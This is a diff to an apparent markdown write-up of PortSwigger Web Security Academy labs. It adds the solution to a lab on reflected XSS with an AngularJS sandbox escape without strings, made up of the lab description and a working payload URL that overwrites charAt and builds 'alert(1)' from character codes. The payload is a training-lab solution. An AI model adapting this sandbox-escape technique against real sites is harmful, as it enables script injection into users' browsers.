@@ -538,7 +538,23 @@ ${alert(1)}
 
 ![](img44.png)
 
-## 19. Lab: Reflected XSS with AngularJS sandbox escape without strings
+## 19. Lab: Reflected XSS with AngularJS sandbox escape without strings (P)
+
+```
+This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.
+
+To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.
+```
+
+URL
+
+```
+https://acb21f281e6b46ae80ce52c30094008a.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+
+![](img45.png)
+
+## 20. Lab: Reflected XSS with AngularJS sandbox escape and CSP
 
 
 
